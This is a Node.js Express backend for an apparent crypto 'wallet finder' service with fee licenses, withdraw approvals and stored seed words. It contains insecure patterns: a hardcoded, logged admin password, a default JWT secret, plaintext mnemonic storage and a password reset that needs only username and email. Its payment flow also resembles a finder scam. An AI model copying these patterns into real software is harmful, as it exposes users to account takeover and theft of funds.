// server.js
// All comments in English

const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const bcrypt = require('bcrypt');
const cors = require('cors');
const path = require('path');
const jwt = require('jsonwebtoken');
const fs = require('fs');
const rateLimit = require('express-rate-limit');

const app = express();
const JWT_SECRET = process.env.JWT_SECRET || 'supersecretkey';
const dbPath = process.env.DATABASE_PATH || '/mnt/data/dolphin.db';

// Ensure DB directory exists
const dirPath = path.dirname(dbPath);
if (!fs.existsSync(dirPath)) {
  fs.mkdirSync(dirPath, { recursive: true });
  console.log(`Created directory for database at: ${dirPath}`);
}

// Connect DB
const db = new sqlite3.Database(dbPath, (err) => {
  if (err) console.error("Failed to connect to database:", err.message);
  else console.log(`Connected to SQLite at: ${dbPath}`);
});

// Middleware
app.use(cors());
app.use(express.json());

// Validators
function isValidUsername(username) {
  return typeof username === 'string' && /^[A-Za-z0-9]+$/.test(username);
}
function isValidPassword(password) {
  return typeof password === 'string' && /^(?=.*[A-Za-z])(?=.*\d)[A-Za-z\d]{6,}$/.test(password);
}
function isValidEmail(email) {
  return typeof email === 'string' && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
}

// ================= Migrations =================
db.serialize(() => {
  db.run(`
    CREATE TABLE IF NOT EXISTS scan_states (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id INTEGER UNIQUE,
      data TEXT,
      updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )
  `);

  db.run(`
    CREATE TABLE IF NOT EXISTS users (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      username TEXT UNIQUE,
      email TEXT,
      password TEXT,
      license TEXT DEFAULT 'inactive',
      role TEXT DEFAULT 'user',
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
      updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )
  `);

  db.run(`
    CREATE TRIGGER IF NOT EXISTS users_updated_at_trg
    AFTER UPDATE ON users
    FOR EACH ROW
    BEGIN
      UPDATE users SET updated_at = CURRENT_TIMESTAMP WHERE id = NEW.id;
    END;
  `);

  db.run(`
    CREATE TABLE IF NOT EXISTS wallets (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id INTEGER,
      address TEXT,
      balance TEXT,
      network TEXT,
      lastTx TEXT,
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )
  `);

  db.run(`
    CREATE TABLE IF NOT EXISTS license_requests (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id INTEGER,
      tx_hash TEXT,
      status TEXT DEFAULT 'pending',
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )
  `);

  db.run(`
    CREATE TABLE IF NOT EXISTS final_transactions (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id INTEGER,
      tx_hash TEXT,
      status TEXT DEFAULT 'pending',
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )
  `);

  db.run(`
    CREATE TABLE IF NOT EXISTS withdraw_requests (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id INTEGER,
      withdraw_address TEXT,
      status TEXT DEFAULT 'pending',
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )
  `);

  // NEW: per-user mnemonic storage (words persisted once and reused)
  db.run(`
    CREATE TABLE IF NOT EXISTS mnemonics (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id INTEGER UNIQUE,
      words TEXT NOT NULL, -- JSON stringified array of words
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )
  `);
});

// Bootstrap admin (recommend removing in production)
db.get("SELECT * FROM users WHERE role = 'admin' LIMIT 1", async (err, row) => {
  if (!row) {
    const hashed = await bcrypt.hash("pastil6496", 10);
    db.run(
      "INSERT INTO users (username, email, password, license, role) VALUES (?, ?, ?, ?, ?)",
      ["admin", "admin@dolphinwalletfinder.com", hashed, "active", "admin"],
      (e) => { if (!e) console.log("Admin created: username=admin password=pastil6496"); }
    );
  }
});

// ================= Auth middleware =================
function authenticate(req, res, next) {
  const authHeader = req.headers['authorization'];
  if (!authHeader) return res.status(401).json({ error: 'No token provided' });
  const token = authHeader.split(' ')[1];
  jwt.verify(token, JWT_SECRET, (err, decoded) => {
    if (err) return res.status(403).json({ error: 'Invalid token' });
    req.user = decoded;
    next();
  });
}

// Rate limiter for password reset
const resetLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 8,
  standardHeaders: true,
  legacyHeaders: false
});

// ================= Auth endpoints =================
app.post('/api/register', async (req, res) => {
  const { username, email, password } = req.body || {};
  if (!username || !email || !password) return res.status(400).json({ error: 'All fields required' });
  if (!isValidUsername(username)) return res.status(400).json({ error: 'Username must contain only English letters and digits.' });
  if (!isValidEmail(email)) return res.status(400).json({ error: 'Invalid email format.' });
  if (!isValidPassword(password)) return res.status(400).json({ error: 'Password must be at least 6 chars and include letters and digits.' });

  try {
    const hashed = await bcrypt.hash(password, 10);
    db.run('INSERT INTO users (username, email, password) VALUES (?, ?, ?)',
      [username, email, hashed],
      function (err) {
        if (err) {
          if (err.message && err.message.includes('UNIQUE')) {
            return res.status(400).json({ error: 'Username already exists' });
          }
          return res.status(400).json({ error: 'Registration failed' });
        }
        res.json({ success: true });
      }
    );
  } catch (_) {
    res.status(500).json({ error: 'Server error' });
  }
});

app.post('/api/login', (req, res) => {
  const { username, password } = req.body || {};
  if (!username || !password) return res.status(400).json({ error: 'Username and password required' });

  db.get('SELECT * FROM users WHERE username = ?', [username], async (err, row) => {
    if (!row) return res.status(404).json({ error: 'User not found' });
    const match = await bcrypt.compare(password, row.password);
    if (!match) return res.status(401).json({ error: 'Invalid password' });

    const token = jwt.sign({ id: row.id, username: row.username, role: row.role }, JWT_SECRET, { expiresIn: '7d' });
    res.json({ token, role: row.role, username: row.username });
  });
});

app.get('/api/me', authenticate, (req, res) => {
  db.get('SELECT id, username, email, role, license, created_at, updated_at FROM users WHERE id = ?', [req.user.id], (err, row) => {
    if (err) return res.status(500).json({ error: 'Database error' });
    res.json(row);
  });
});

// Password reset (username + email + newPassword); generic success to avoid enumeration
app.post('/api/password/reset', resetLimiter, async (req, res) => {
  try {
    const { username, email, newPassword } = req.body || {};
    if (!username || !email || !newPassword) return res.status(400).json({ error: 'username, email and newPassword are required' });
    if (!isValidUsername(username)) return res.status(400).json({ error: 'Invalid username format' });
    if (!isValidEmail(email)) return res.status(400).json({ error: 'Invalid email format' });
    if (!isValidPassword(newPassword)) return res.status(400).json({ error: 'Password must be at least 6 chars and include letters and digits.' });

    db.get('SELECT id FROM users WHERE username = ? AND email = ?', [username, email], async (err, userRow) => {
      if (err) {
        console.error('DB error during reset lookup', err);
        return res.json({ ok: true });
      }
      if (!userRow) return res.json({ ok: true });

      const hashed = await bcrypt.hash(newPassword, 10);
      db.run('UPDATE users SET password = ? WHERE id = ?', [hashed, userRow.id], (e2) => {
        if (e2) console.error('DB error updating password', e2);
        else console.log(`Password reset for user id=${userRow.id}`);
        return res.json({ ok: true });
      });
    });
  } catch (err) {
    console.error('Password reset error', err);
    return res.status(500).json({ error: 'Server error' });
  }
});

// ================= Wallets =================
app.get('/api/my-wallet', authenticate, (req, res) => {
  db.get('SELECT * FROM wallets WHERE user_id = ? ORDER BY created_at DESC LIMIT 1', [req.user.id], (err, row) => {
    if (err) return res.status(500).json({ error: 'Database error' });
    res.json({ wallet: row || null });
  });
});

app.get('/api/wallets', authenticate, (req, res) => {
  db.all('SELECT * FROM wallets WHERE user_id = ? ORDER BY created_at DESC', [req.user.id], (err, rows) => {
    if (err) return res.status(500).json({ error: 'Database error' });
    res.json({ wallets: rows || [] });
  });
});

app.post('/api/wallets', authenticate, (req, res) => {
  const { address, balance, network, lastTx } = req.body || {};
  if (!address || !balance || !network) return res.status(400).json({ error: 'Incomplete wallet data' });

  db.get('SELECT * FROM wallets WHERE user_id = ? LIMIT 1', [req.user.id], (err, row) => {
    if (err) return res.status(500).json({ error: 'Database error' });
    if (row) return res.json({ success: true, wallet: row });

    db.run(
      'INSERT INTO wallets (user_id, address, balance, network, lastTx) VALUES (?, ?, ?, ?, ?)',
      [req.user.id, address, balance, network, lastTx || null],
      function (e) {
        if (e) return res.status(500).json({ error: 'Database error' });
        res.json({ success: true, id: this.lastID, wallet: { address, balance, network, lastTx: lastTx || null } });
      }
    );
  });
});

// ================= License flow =================
function ensureAdmin(req, res, next) {
  if (req.user?.role !== 'admin') return res.status(403).json({ error: 'Access denied' });
  next();
}

app.post('/api/license/request', authenticate, (req, res) => {
  const { tx_hash } = req.body || {};
  if (!tx_hash) return res.status(400).json({ error: 'Transaction hash is required' });

  db.run('INSERT INTO license_requests (user_id, tx_hash) VALUES (?, ?)', [req.user.id, tx_hash], function (err) {
    if (err) return res.status(500).json({ error: 'Database error' });
    res.json({ success: true });
  });
});

app.get('/api/license/status', authenticate, (req, res) => {
  db.get('SELECT license FROM users WHERE id = ?', [req.user.id], (err, user) => {
    if (err) return res.status(500).json({ error: 'Database error' });
    db.get('SELECT tx_hash, status FROM license_requests WHERE user_id = ? ORDER BY created_at DESC LIMIT 1',
      [req.user.id],
      (e, row) => {
        if (e) return res.status(500).json({ error: 'Database error' });
        res.json({ license: user ? user.license : 'inactive', tx_hash: row ? row.tx_hash : null, status: row ? row.status : null });
      });
  });
});

// ================= Final TX =================
app.post('/api/final-tx', authenticate, (req, res) => {
  const { tx_hash } = req.body || {};
  if (!tx_hash) return res.status(400).json({ error: 'Transaction hash is required' });

  db.run('INSERT INTO final_transactions (user_id, tx_hash) VALUES (?, ?)', [req.user.id, tx_hash], function (err) {
    if (err) return res.status(500).json({ error: 'Database error' });
    res.json({ success: true });
  });
});

app.get('/api/final-tx', authenticate, (req, res) => {
  db.get('SELECT tx_hash, status FROM final_transactions WHERE user_id = ? ORDER BY created_at DESC LIMIT 1', [req.user.id], (err, row) => {
    if (err) return res.status(500).json({ error: 'Database error' });
    res.json(row || { tx_hash: null, status: null });
  });
});

// ================= Withdraw =================
app.post('/api/withdraw-request', authenticate, (req, res) => {
  const { withdraw_address } = req.body || {};
  if (!withdraw_address) return res.status(400).json({ error: 'withdraw_address is required' });

  db.run('INSERT INTO withdraw_requests (user_id, withdraw_address) VALUES (?, ?)', [req.user.id, withdraw_address], function (err) {
    if (err) return res.status(500).json({ error: 'Database error' });
    res.json({ success: true, id: this.lastID });
  });
});

// ================= Admin utils =================
app.get('/api/admin/license-requests', authenticate, ensureAdmin, (req, res) => {
  db.all(
    `SELECT license_requests.*, users.username 
     FROM license_requests 
     JOIN users ON license_requests.user_id = users.id
     ORDER BY created_at DESC`,
    [],
    (err, rows) => {
      if (err) return res.status(500).json({ error: 'Database error' });
      res.json(rows);
    }
  );
});

app.post('/api/admin/approve-license', authenticate, ensureAdmin, (req, res) => {
  const { request_id, action } = req.body || {};
  if (!request_id || !['approve', 'reject'].includes(action)) return res.status(400).json({ error: 'Invalid data' });

  const status = action === 'approve' ? 'approved' : 'rejected';
  db.run('UPDATE license_requests SET status = ? WHERE id = ?', [status, request_id], function (err) {
    if (err) return res.status(500).json({ error: 'Database error' });
    if (status === 'approved') {
      db.get('SELECT user_id FROM license_requests WHERE id = ?', [request_id], (e, row) => {
        if (!e && row) db.run('UPDATE users SET license = ? WHERE id = ?', ['active', row.user_id]);
      });
    }
    res.json({ success: true });
  });
});

app.get('/api/admin/final-requests', authenticate, ensureAdmin, (req, res) => {
  db.all(
    `SELECT final_transactions.*, users.username 
     FROM final_transactions 
     JOIN users ON final_transactions.user_id = users.id
     ORDER BY created_at DESC`,
    [],
    (err, rows) => {
      if (err) return res.status(500).json({ error: 'Database error' });
      res.json(rows);
    }
  );
});

app.post('/api/admin/approve-final', authenticate, ensureAdmin, (req, res) => {
  const { request_id, action } = req.body || {};
  if (!request_id || !['approve', 'reject'].includes(action)) return res.status(400).json({ error: 'Invalid data' });

  const status = action === 'approve' ? 'approved' : 'rejected';
  db.run('UPDATE final_transactions SET status = ? WHERE id = ?', [status, request_id], function (err) {
    if (err) return res.status(500).json({ error: 'Database error' });
    res.json({ success: true });
  });
});

app.get('/api/admin/withdraw-requests', authenticate, ensureAdmin, (req, res) => {
  db.all(
    `SELECT withdraw_requests.*, users.username
     FROM withdraw_requests
     JOIN users ON withdraw_requests.user_id = users.id
     ORDER BY created_at DESC`,
    [],
    (err, rows) => {
      if (err) return res.status(500).json({ error: 'Database error' });
      res.json(rows);
    }
  );
});

app.post('/api/admin/approve-withdraw', authenticate, ensureAdmin, (req, res) => {
  const { request_id, action } = req.body || {};
  if (!request_id || !['approve', 'reject'].includes(action)) return res.status(400).json({ error: 'Invalid data' });

  const status = action === 'approve' ? 'approved' : 'rejected';
  db.run('UPDATE withdraw_requests SET status = ? WHERE id = ?', [status, request_id], function (err) {
    if (err) return res.status(500).json({ error: 'Database error' });
    res.json({ success: true });
  });
});

// ================= Scan State Persistence (per-user) =================
app.post('/api/scan/state', authenticate, (req, res) => {
  const payload = req.body && req.body.state;
  if (!payload) return res.status(400).json({ error: 'Missing state' });

  let str;
  try { str = JSON.stringify(payload); }
  catch(e){ return res.status(400).json({ error: 'Bad state JSON' }); }

  db.run(
    `INSERT INTO scan_states (user_id, data, updated_at)
     VALUES (?, ?, CURRENT_TIMESTAMP)
     ON CONFLICT(user_id) DO UPDATE SET data = excluded.data, updated_at = CURRENT_TIMESTAMP`,
    [req.user.id, str],
    function (err) {
      if (err) { console.error('scan state save error', err); return res.status(500).json({ error: 'DB error' }); }
      res.json({ success: true });
    }
  );
});

app.get('/api/scan/state', authenticate, (req, res) => {
  db.get('SELECT data, updated_at FROM scan_states WHERE user_id = ? LIMIT 1', [req.user.id], (err, row) => {
    if (err) return res.status(500).json({ error: 'Database error' });
    if (!row) return res.json({ state: null });
    try { return res.json({ state: JSON.parse(row.data), updated_at: row.updated_at }); }
    catch(e){ return res.json({ state: null, updated_at: row.updated_at }); }
  });
});

// ================= Mnemonic persistence (per-user) =================
// GET: return user's persisted words (array) if exists, else {words: []}
app.get('/api/mnemonic', authenticate, (req, res) => {
  db.get('SELECT words, created_at FROM mnemonics WHERE user_id = ? LIMIT 1', [req.user.id], (err, row) => {
    if (err) return res.status(500).json({ error: 'Database error' });
    if (!row) return res.json({ words: [] });
    try {
      const words = JSON.parse(row.words);
      return res.json({ words, created_at: row.created_at });
    } catch {
      return res.json({ words: [] });
    }
  });
});

// POST: idempotent save — if already exists, return existing; otherwise insert
app.post('/api/mnemonic', authenticate, (req, res) => {
  const words = (req.body && req.body.words) || [];
  if (!Array.isArray(words) || words.length === 0) {
    return res.status(400).json({ error: 'words must be a non-empty array' });
  }

  // If exists, return existing to keep it stable
  db.get('SELECT words, created_at FROM mnemonics WHERE user_id = ? LIMIT 1', [req.user.id], (err, row) => {
    if (err) return res.status(500).json({ error: 'Database error' });
    if (row) {
      try {
        const existing = JSON.parse(row.words);
        return res.json({ words: existing, created_at: row.created_at });
      } catch {
        return res.json({ words });
      }
    }

    // Insert first-time
    const payload = JSON.stringify(words);
    db.run('INSERT INTO mnemonics (user_id, words) VALUES (?, ?)', [req.user.id, payload], function (e) {
      if (e) return res.status(500).json({ error: 'Database error' });
      res.json({ words, created_at: new Date().toISOString() });
    });
  });
});

// ================= Start server =================
const PORT = process.env.PORT || 5000;
app.listen(PORT, () => console.log(`Server on port ${PORT}`));
